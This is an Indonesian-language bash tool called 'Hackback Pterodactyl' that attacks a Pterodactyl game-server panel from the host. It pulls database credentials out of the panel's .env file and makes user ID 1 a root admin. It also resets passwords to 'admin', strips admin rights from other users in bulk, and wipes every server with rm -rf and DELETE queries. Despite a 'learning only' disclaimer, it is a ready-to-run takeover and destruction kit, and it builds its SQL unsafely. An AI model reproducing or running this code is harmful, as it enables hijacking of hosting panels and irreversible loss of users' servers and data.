#!/bin/bash

# -------------------------------
# HACKBACK PTERODACTYL - ULTIMATE EDITION
# Fitur: Clear All Server + Admin ID 1
# -------------------------------
# * Gunakan dengan bijak!
# * Hanya untuk tujuan pembelajaran
# -------------------------------

# Konfigurasi
PTERO_DIR="/var/www/pterodactyl"
DB_CONFIG="$PTERO_DIR/config/database.php"
ENV_FILE="$PTERO_DIR/.env"

# Warna Premium
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
ORANGE='\033[0;33m'
NC='\033[0m'

# Ikon
CHECK="âœ…"
CROSS="âŒ"
WARNING="âš ï¸"
LOCK="ðŸ”’"
KEY="ðŸ”‘"
GEAR="âš™ï¸"
FIRE="ðŸ”¥"
SKULL="ðŸ’€"
BOMB="ðŸ’£"
TRASH="ðŸ—‘ï¸"
CROWN="ðŸ‘‘"
SWORD="âš”ï¸"
SHIELD="ðŸ›¡ï¸"

# Password default
DEFAULT_PASSWORD="admin"

# Header
show_header() {
    clear
    echo -e "${RED}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${RED}â•‘${WHITE}                                                                              ${RED}â•‘${NC}"
    echo -e "${RED}â•‘${WHITE}              ${FIRE} HACKBACK PTERODACTYL - ULTIMATE EDITION ${FIRE}                  ${RED}â•‘${NC}"
    echo -e "${RED}â•‘${WHITE}              ${SKULL} Clear All Server + Add Admin ID 1 ${SKULL}                    ${RED}â•‘${NC}"
    echo -e "${RED}â•‘${WHITE}                         *Master Edition*                                        ${RED}â•‘${NC}"
    echo -e "${RED}â•‘${WHITE}                                                                              ${RED}â•‘${NC}"
    echo -e "${RED}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    echo -e "${YELLOW}${WARNING} PERINGATAN: Fitur ini sangat destruktif! Hanya untuk pembelajaran!${NC}"
    echo -e "${RED}${WARNING} Jangan gunakan di panel orang lain!${NC}"
    echo ""
}

# Function: Extract DB info from .env
get_db_info() {
    if [ -f "$ENV_FILE" ]; then
        DB_HOST=$(grep DB_HOST "$ENV_FILE" | cut -d '=' -f2)
        DB_PORT=$(grep DB_PORT "$ENV_FILE" | cut -d '=' -f2)
        DB_DATABASE=$(grep DB_DATABASE "$ENV_FILE" | cut -d '=' -f2)
        DB_USERNAME=$(grep DB_USERNAME "$ENV_FILE" | cut -d '=' -f2)
        DB_PASSWORD=$(grep DB_PASSWORD "$ENV_FILE" | cut -d '=' -f2)
        
        # Default values jika kosong
        [ -z "$DB_HOST" ] && DB_HOST="127.0.0.1"
        [ -z "$DB_PORT" ] && DB_PORT="3306"
        [ -z "$DB_DATABASE" ] && DB_DATABASE="pterodactyl"
        [ -z "$DB_USERNAME" ] && DB_USERNAME="pterodactyl"
    else
        echo -e "${RED}${CROSS} File .env tidak ditemukan!${NC}"
        exit 1
    fi
}

# Function: Check MySQL connection
check_mysql() {
    echo -e "${YELLOW}${GEAR} Memeriksa koneksi database...${NC}"
    
    if command -v mysql &> /dev/null; then
        MYSQL_CMD="mysql"
    elif command -v mariadb &> /dev/null; then
        MYSQL_CMD="mariadb"
    else
        echo -e "${RED}${CROSS} MySQL/MariaDB tidak ditemukan!${NC}"
        return 1
    fi
    
    if $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -e "USE $DB_DATABASE" 2>/dev/null; then
        echo -e "${GREEN}${CHECK} Koneksi database berhasil!${NC}"
        return 0
    else
        echo -e "${RED}${CROSS} Gagal konek ke database!${NC}"
        return 1
    fi
}

# ==============================================
# FITUR 1: ADD SKILL / ADMIN ID 1
# ==============================================

# Function: Make ID 1 Super Admin (with all privileges)
make_id1_super_admin() {
    echo -e "\n${YELLOW}${CROWN} Membuat ID 1 menjadi SUPER ADMIN...${NC}"
    echo -e "${YELLOW}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€${NC}"
    
    # Cek apakah user ID 1 ada
    CHECK_USER=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id FROM users WHERE id = 1" 2>/dev/null)
    
    if [ -z "$CHECK_USER" ]; then
        echo -e "${RED}${CROSS} User ID 1 tidak ditemukan!${NC}"
        return 1
    fi
    
    # 1. Set root_admin = 1 (admin penuh)
    echo -e "${CYAN}âš¡ Set root_admin = 1...${NC}"
    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "UPDATE users SET root_admin = 1 WHERE id = 1" 2>/dev/null
    
    # 2. Set permissions di tabel permissions (jika ada)
    echo -e "${CYAN}âš¡ Set all permissions...${NC}"
    
    # Hapus permissions lama
    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "DELETE FROM permissions WHERE user_id = 1" 2>/dev/null
    
    # Tambah permissions baru (admin full)
    # Format: INSERT INTO permissions (user_id, permission) VALUES (1, '*-*-*')
    # Tapi kita akan set semua permission yang umum
    
    # Cek tabel permissions ada atau tidak
    TABLE_CHECK=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SHOW TABLES LIKE 'permissions'" 2>/dev/null)
    
    if [ -n "$TABLE_CHECK" ]; then
        # List of common permissions
        PERMISSIONS=(
            "websocket.*"
            "admin.*"
            "user.*"
            "server.*"
            "node.*"
            "allocation.*"
            "egg.*"
            "nest.*"
            "database.*"
            "schedule.*"
            "backup.*"
            "subuser.*"
            "startup.*"
            "settings.*"
        )
        
        for perm in "${PERMISSIONS[@]}"; do
            $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "INSERT INTO permissions (user_id, permission) VALUES (1, '$perm')" 2>/dev/null
        done
        echo -e "${GREEN}${CHECK} Permissions updated${NC}"
    fi
    
    # 3. Set password ke default 'admin' (opsional)
    echo -ne "${CYAN}Reset password ke 'admin'? (y/n): ${NC}"
    read reset_pass
    
    if [[ "$reset_pass" =~ ^[Yy]$ ]]; then
        PASSWORD_HASH=$(php -r "echo password_hash('admin', PASSWORD_BCRYPT);" 2>/dev/null)
        $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "UPDATE users SET password = '$PASSWORD_HASH' WHERE id = 1" 2>/dev/null
        echo -e "${GREEN}${CHECK} Password ID 1 direset ke: ${YELLOW}admin${NC}"
    fi
    
    # Tampilkan hasil
    echo -e "\n${GREEN}${CHECK} ID 1 sekarang adalah SUPER ADMIN!${NC}"
    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, username, email, root_admin FROM users WHERE id = 1" 2>/dev/null | column -t
    
    echo -e "\n${YELLOW}${CROWN} User ID 1 memiliki akses penuh ke panel!${NC}"
}

# ==============================================
# FITUR 2: CLEAR ALL SERVERS (HAPUS SEMUA SERVER)
# ==============================================

# Function: Count total servers
count_servers() {
    TOTAL_SERVERS=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT COUNT(*) FROM servers" 2>/dev/null | tail -n +2)
    echo "$TOTAL_SERVERS"
}

# Function: Delete all server files from disk
delete_server_files() {
    local server_uuid=$1
    
    # Path ke data server
    DATA_PATH="/var/lib/pterodactyl/volumes/$server_uuid"
    
    if [ -d "$DATA_PATH" ]; then
        rm -rf "$DATA_PATH"
        return 0
    fi
    return 1
}

# Function: Clear all servers (DESTRUCTIVE!)
clear_all_servers() {
    echo -e "\n${RED}${BOMB} CLEAR ALL SERVERS - FITUR DESTRUKTIF! ${BOMB}${NC}"
    echo -e "${RED}${WARNING} INI AKAN MENGHAPUS SEMUA SERVER PERMANEN! ${WARNING}${NC}"
    echo -e "${RED}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€${NC}"
    
    # Hitung total server
    TOTAL=$(count_servers)
    echo -e "${YELLOW}ðŸ“Š Total server saat ini: ${WHITE}$TOTAL${NC}"
    
    if [ "$TOTAL" -eq 0 ]; then
        echo -e "${YELLOW}${WARNING} Tidak ada server untuk dihapus${NC}"
        return 0
    fi
    
    # Konfirmasi level 1
    echo -e "\n${RED}${SKULL} KONFIRMASI LEVEL 1:${NC}"
    echo -ne "${YELLOW}Ketik 'HAPUS SEMUA SERVER' untuk melanjutkan: ${NC}"
    read confirm1
    
    if [ "$confirm1" != "HAPUS SEMUA SERVER" ]; then
        echo -e "${GREEN}${CHECK} Dibatalkan${NC}"
        return 0
    fi
    
    # Konfirmasi level 2
    echo -e "\n${RED}${SKULL} KONFIRMASI LEVEL 2 (FINAL):${NC}"
    echo -ne "${YELLOW}Ketik jumlah server ($TOTAL) untuk konfirmasi akhir: ${NC}"
    read confirm2
    
    if [ "$confirm2" != "$TOTAL" ]; then
        echo -e "${GREEN}${CHECK} Dibatalkan${NC}"
        return 0
    fi
    
    echo -e "\n${RED}${BOMB} MULAI MENGHAPUS $TOTAL SERVER... ${BOMB}${NC}"
    sleep 2
    
    # 1. Dapatkan daftar UUID server untuk hapus files
    SERVER_LIST=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, uuid, name FROM servers" 2>/dev/null | tail -n +2)
    
    # Counter
    DELETED=0
    FAILED=0
    
    echo "$SERVER_LIST" | while read line; do
        SERVER_ID=$(echo "$line" | awk '{print $1}')
        SERVER_UUID=$(echo "$line" | awk '{print $2}')
        SERVER_NAME=$(echo "$line" | awk '{print $3}')
        
        echo -e "\n${YELLOW}${GEAR} Menghapus server: $SERVER_NAME (ID: $SERVER_ID)${NC}"
        
        # Hapus file server
        if delete_server_files "$SERVER_UUID"; then
            echo -e "  ${GREEN}${CHECK} File server dihapus${NC}"
        else
            echo -e "  ${YELLOW}âš ï¸  File server tidak ditemukan${NC}"
        fi
        
        # Hapus dari database (constraints akan cascade)
        
        # Hapus subusers
        $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "DELETE FROM subusers WHERE server_id = $SERVER_ID" 2>/dev/null
        echo -e "  ${GREEN}${CHECK} Subusers dihapus${NC}"
        
        # Hapus databases
        $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "DELETE FROM databases WHERE server_id = $SERVER_ID" 2>/dev/null
        echo -e "  ${GREEN}${CHECK} Databases dihapus${NC}"
        
        # Hapus schedules
        $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "DELETE FROM schedules WHERE server_id = $SERVER_ID" 2>/dev/null
        echo -e "  ${GREEN}${CHECK} Schedules dihapus${NC}"
        
        # Hapus backups
        $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "DELETE FROM backups WHERE server_id = $SERVER_ID" 2>/dev/null
        echo -e "  ${GREEN}${CHECK} Backups dihapus${NC}"
        
        # Hapus allocations (khusus server ini)
        $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "DELETE FROM allocations WHERE server_id = $SERVER_ID" 2>/dev/null
        echo -e "  ${GREEN}${CHECK} Allocations dihapus${NC}"
        
        # Hapus server
        $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "DELETE FROM servers WHERE id = $SERVER_ID" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            echo -e "  ${GREEN}${CHECK} Server dihapus dari database${NC}"
            DELETED=$((DELETED + 1))
        else
            echo -e "  ${RED}${CROSS} Gagal hapus server${NC}"
            FAILED=$((FAILED + 1))
        fi
        
        sleep 0.5
    done
    
    # Reset auto_increment (opsional)
    echo -e "\n${CYAN}âš¡ Mereset auto_increment servers table...${NC}"
    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "ALTER TABLE servers AUTO_INCREMENT = 1" 2>/dev/null
    
    echo -e "\n${RED}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${GREEN}âœ… CLEAR ALL SERVERS COMPLETE!${NC}"
    echo -e "${RED}ðŸ—‘ï¸  Total server dihapus: ${WHITE}$DELETED${NC}"
    echo -e "${RED}âŒ Gagal: ${WHITE}$FAILED${NC}"
    echo -e "${RED}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
}

# ==============================================
# FUNCTION: Clear specific user's servers
# ==============================================
clear_user_servers() {
    local user_id=$1
    
    echo -e "\n${RED}${BOMB} Menghapus semua server milik user ID: $user_id${NC}"
    
    # Cek user
    CHECK_USER=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id FROM users WHERE id = $user_id" 2>/dev/null)
    
    if [ -z "$CHECK_USER" ]; then
        echo -e "${RED}${CROSS} User ID $user_id tidak ditemukan!${NC}"
        return 1
    fi
    
    # Hitung server user
    USER_SERVERS=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT COUNT(*) FROM servers WHERE owner_id = $user_id" 2>/dev/null | tail -n +2)
    
    echo -e "${YELLOW}ðŸ“Š User memiliki $USER_SERVERS server${NC}"
    
    if [ "$USER_SERVERS" -eq 0 ]; then
        echo -e "${YELLOW}${WARNING} User tidak memiliki server${NC}"
        return 0
    fi
    
    echo -ne "${RED}Yakin hapus semua server user ini? (y/n): ${NC}"
    read confirm
    
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        echo -e "${GREEN}${CHECK} Dibatalkan${NC}"
        return 0
    fi
    
    # Dapatkan daftar server user
    SERVER_LIST=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, uuid, name FROM servers WHERE owner_id = $user_id" 2>/dev/null | tail -n +2)
    
    DELETED=0
    echo "$SERVER_LIST" | while read line; do
        SERVER_ID=$(echo "$line" | awk '{print $1}')
        SERVER_UUID=$(echo "$line" | awk '{print $2}')
        SERVER_NAME=$(echo "$line" | awk '{print $3}')
        
        echo -e "${YELLOW}Menghapus: $SERVER_NAME${NC}"
        
        # Hapus file
        delete_server_files "$SERVER_UUID"
        
        # Hapus dari database
        $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "DELETE FROM servers WHERE id = $SERVER_ID" 2>/dev/null
        
        DELETED=$((DELETED + 1))
    done
    
    echo -e "${GREEN}${CHECK} Berhasil menghapus $DELETED server milik user ID $user_id${NC}"
}

# ==============================================
# MAIN MENU
# ==============================================
show_menu() {
    echo ""
    echo -e "${WHITE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${WHITE}â•‘                    ${FIRE} HACKBACK ULTIMATE MENU ${FIRE}                           â•‘${NC}"
    echo -e "${WHITE}â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£${NC}"
    echo -e "${WHITE}â•‘                                                                              â•‘${NC}"
    echo -e "${WHITE}â•‘  ${RED}[1]${NC} ðŸ” Get User by ID                        ${GREEN}[8]${NC} âš¡ Get ID 1         â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[2]${NC} ðŸ“‹ List Users                           ${YELLOW}[9]${NC} ðŸ”‘ Change Password â•‘${NC}"
    echo -e "${WHITE}â•‘  ${YELLOW}[3]${NC} ðŸ“Š Total Users & Admin                  ${BLUE}[10]${NC} ðŸ‘‘ Un Admin        â•‘${NC}"
    echo -e "${WHITE}â•‘  ${BLUE}[4]${NC} ðŸ‘¤ Cari by Username                      ${PURPLE}[11]${NC} ðŸ‘‘ðŸ‘‘ Batch Un Admin â•‘${NC}"
    echo -e "${WHITE}â•‘  ${PURPLE}[5]${NC} ðŸ“§ Cari by Email                        ${RED}[12]${NC} ${CROWN} ADD ADMIN ID 1  â•‘${NC}"
    echo -e "${WHITE}â•‘  ${CYAN}[6]${NC} ðŸ‘‘ Cek Admin Status                      ${GREEN}[13]${NC} ${BOMB} CLEAR ALL SERVER â•‘${NC}"
    echo -e "${WHITE}â•‘  ${RED}[7]${NC} ðŸ–¥ï¸  Lihat Servers User                    ${YELLOW}[14]${NC} ðŸ—‘ï¸  Clear User Servers â•‘${NC}"
    echo -e "${WHITE}â•‘                                                                              â•‘${NC}"
    echo -e "${WHITE}â•‘  ${RED}[0]${NC} ðŸšª Keluar                                                     â•‘${NC}"
    echo -e "${WHITE}â•‘                                                                              â•‘${NC}"
    echo -e "${WHITE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    echo -ne "${YELLOW}âž¤ Pilih menu [0-14]: ${NC}"
}

# Main function
main() {
    show_header
    
    # Get DB info
    get_db_info
    
    # Check MySQL connection
    if ! check_mysql; then
        echo -e "\n${RED}${CROSS} Tidak bisa mengakses database!${NC}"
        exit 1
    fi
    
    # Menu loop
    while true; do
        show_menu
        read choice
        
        case $choice in
            1)
                echo -ne "${CYAN}Masukkan ID user: ${NC}"
                read user_id
                get_user_by_id "$user_id"
                ;;
            2)
                echo -ne "${CYAN}Jumlah user (default 10): ${NC}"
                read limit
                limit=${limit:-10}
                list_users "$limit"
                ;;
            3)
                total_users
                ;;
            4)
                echo -ne "${CYAN}Masukkan username: ${NC}"
                read username
                search_by_username "$username"
                ;;
            5)
                echo -ne "${CYAN}Masukkan email: ${NC}"
                read email
                search_by_email "$email"
                ;;
            6)
                echo -ne "${CYAN}Masukkan ID user: ${NC}"
                read user_id
                check_admin "$user_id"
                ;;
            7)
                echo -ne "${CYAN}Masukkan ID user: ${NC}"
                read user_id
                get_user_servers "$user_id"
                ;;
            8)
                echo -e "\n${GREEN}âš¡ Mengakses USER ID 1...${NC}"
                get_user_by_id 1
                get_user_servers 1
                ;;
            9)
                echo -ne "${CYAN}Masukkan ID user: ${NC}"
                read user_id
                echo -ne "${CYAN}Password baru (enter=admin): ${NC}"
                read new_pass
                new_pass=${new_pass:-$DEFAULT_PASSWORD}
                change_password "$user_id" "$new_pass"
                ;;
            10)
                echo -ne "${CYAN}Masukkan ID user: ${NC}"
                read user_id
                un_admin "$user_id"
                ;;
            11)
                echo -ne "${CYAN}Mulai dari ID (default 2): ${NC}"
                read start_id
                start_id=${start_id:-2}
                batch_un_admin "$start_id"
                ;;
            12)
                make_id1_super_admin
                ;;
            13)
                clear_all_servers
                ;;
            14)
                echo -ne "${CYAN}Masukkan ID user: ${NC}"
                read user_id
                clear_user_servers "$user_id"
                ;;
            0)
                echo -e "\n${GREEN}âœ¨ Thanks for using Hackback Ultimate Edition!${NC}"
                echo -e "${RED}â¤ï¸  Subscribe channel Rendzz Official!${NC}"
                echo -e "${CYAN}ðŸ“± Telegram: @lynnn046${NC}\n"
                exit 0
                ;;
            *)
                echo -e "${RED}Pilihan tidak valid!${NC}"
                ;;
        esac
        
        echo ""
        echo -ne "${CYAN}Tekan Enter untuk melanjutkan...${NC}"
        read
        clear
        show_header
    done
}

# ==============================================
# SUPPORTING FUNCTIONS
# ==============================================

get_user_by_id() {
    local user_id=$1
    
    QUERY="SELECT id, uuid, username, email, name_first, name_last, root_admin FROM users WHERE id = $user_id"
    
    RESULT=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "$QUERY" 2>/dev/null | tail -n +2)
    
    if [ -n "$RESULT" ]; then
        echo -e "\n${GREEN}${CHECK} USER DITEMUKAN!${NC}\n"
        echo "$RESULT" | while read line; do
            ID=$(echo "$line" | awk '{print $1}')
            UUID=$(echo "$line" | awk '{print $2}')
            USERNAME=$(echo "$line" | awk '{print $3}')
            EMAIL=$(echo "$line" | awk '{print $4}')
            FIRST=$(echo "$line" | awk '{print $5}')
            LAST=$(echo "$line" | awk '{print $6}')
            ADMIN=$(echo "$line" | awk '{print $7}')
            
            echo -e "${WHITE}ID: ${GREEN}$ID${NC}"
            echo -e "UUID: $UUID"
            echo -e "Username: $USERNAME"
            echo -e "Email: $EMAIL"
            echo -e "Name: $FIRST $LAST"
            echo -e "Admin: $([ "$ADMIN" == "1" ] && echo "${GREEN}Yes${NC}" || echo "${RED}No${NC}")"
            echo "---"
        done
    else
        echo -e "${RED}${CROSS} User tidak ditemukan!${NC}"
    fi
}

list_users() {
    local limit=$1
    
    echo -e "\n${CYAN}ðŸ“‹ Daftar Users (top $limit):${NC}"
    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, username, email, root_admin FROM users ORDER BY id ASC LIMIT $limit" 2>/dev/null | column -t
}

total_users() {
    TOTAL=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT COUNT(*) FROM users" 2>/dev/null | tail -n +2)
    ADMIN=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT COUNT(*) FROM users WHERE root_admin = 1" 2>/dev/null | tail -n +2)
    
    echo -e "${GREEN}ðŸ“Š Total Users: $TOTAL${NC}"
    echo -e "${GREEN}ðŸ‘‘ Total Admin: $ADMIN${NC}"
}

search_by_username() {
    local username=$1
    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, username, email, root_admin FROM users WHERE username LIKE '%$username%' ORDER BY id" 2>/dev/null | column -t
}

search_by_email() {
    local email=$1
    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, username, email, root_admin FROM users WHERE email LIKE '%$email%' ORDER BY id" 2>/dev/null | column -t
}

check_admin() {
    local user_id=$1
    IS_ADMIN=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT root_admin FROM users WHERE id = $user_id" 2>/dev/null | tail -n +2)
    
    if [ "$IS_ADMIN" == "1" ]; then
        echo -e "${GREEN}âœ… User ID $user_id adalah ADMIN!${NC}"
    else
        echo -e "${RED}âŒ User ID $user_id BUKAN admin${NC}"
    fi
}

get_user_servers() {
    local user_id=$1
    
    echo -e "\n${CYAN}ðŸ–¥ï¸  Server milik user ID $user_id:${NC}"
    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, name, uuid FROM servers WHERE owner_id = $user_id" 2>/dev/null | column -t
    
    TOTAL=$($MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT COUNT(*) FROM servers WHERE owner_id = $user_id" 2>/dev/null | tail -n +2)
    echo -e "\n${YELLOW}Total: $TOTAL server${NC}"
}

change_password() {
    local user_id=$1
    local new_pass=$2
    
    echo -e "\n${YELLOW}ðŸ”‘ Mengubah password user ID: $user_id${NC}"
    
    PASSWORD_HASH=$(php -r "echo password_hash('$new_pass', PASSWORD_BCRYPT);" 2>/dev/null)
    
    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "UPDATE users SET password = '$PASSWORD_HASH' WHERE id = $user_id" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}${CHECK} Password berhasil diubah ke: ${YELLOW}$new_pass${NC}"
    else
        echo -e "${RED}${CROSS} Gagal mengubah password!${NC}"
    fi
}

un_admin() {
    local user_id=$1
    
    echo -e "\n${YELLOW}ðŸ‘‘ Menghapus status admin user ID: $user_id${NC}"
    
    $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "UPDATE users SET root_admin = 0 WHERE id = $user_id" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}${CHECK} Status admin dihapus!${NC}"
    else
        echo -e "${RED}${CROSS} Gagal menghapus status admin!${NC}"
    fi
}

batch_un_admin() {
    local start_id=$1
    
    echo -e "\n${YELLOW}ðŸ‘‘ðŸ‘‘ Batch Un Admin mulai dari ID $start_id${NC}"
    echo -e "${RED}${WARNING} PERINGATAN: Ini akan menghapus semua admin kecuali ID 1${NC}"
    echo -ne "${CYAN}Yakin? (y/n): ${NC}"
    read confirm
    
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "UPDATE users SET root_admin = 0 WHERE id >= $start_id" 2>/dev/null
        echo -e "${GREEN}${CHECK} Semua user ID >= $start_id sudah bukan admin${NC}"
        
        # Tampilkan admin yang tersisa
        echo -e "\n${YELLOW}Admin yang tersisa:${NC}"
        $MYSQL_CMD -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USERNAME" -p"$DB_PASSWORD" -D "$DB_DATABASE" -e "SELECT id, username, email FROM users WHERE root_admin = 1" 2>/dev/null | column -t
    else
        echo -e "${GREEN}${CHECK} Dibatalkan${NC}"
    fi
}

# Run main
main
